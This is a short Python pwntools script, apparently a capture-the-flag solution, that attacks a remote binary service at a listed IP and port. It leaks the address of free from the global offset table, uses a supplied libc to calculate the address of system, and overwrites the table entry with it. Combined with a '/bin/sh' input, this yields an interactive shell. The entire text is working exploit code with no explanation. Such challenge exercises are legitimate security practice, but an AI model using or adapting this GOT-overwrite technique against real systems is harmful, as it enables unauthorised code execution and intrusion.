from pwn import *
import ctypes
context(log_level="debug")
p = remote('128.199.220.74', 10004)
#p  = process("./got2")
elf = ELF('./libc.so.6_pwn5')
p.recvuntil("What's your name?\n")
p.sendline("/bin/sh\0")
p.recvuntil("Please input again\n")
p.sendline("/bin/sh\0")
p.recvuntil("so far.\n")
free_got = 0x0804a014
p.sendline(str(int(free_got)))
p.recvuntil('read:0x')
free_addr = int(p.recv(8),16)
print 'free = '+hex(free_addr)

system_addr = free_addr - elf.symbols['free'] + elf.symbols['system']  

print 'system = '+hex(system_addr)
p.sendline(str(ctypes.c_int(system_addr).value))
p.interactive()
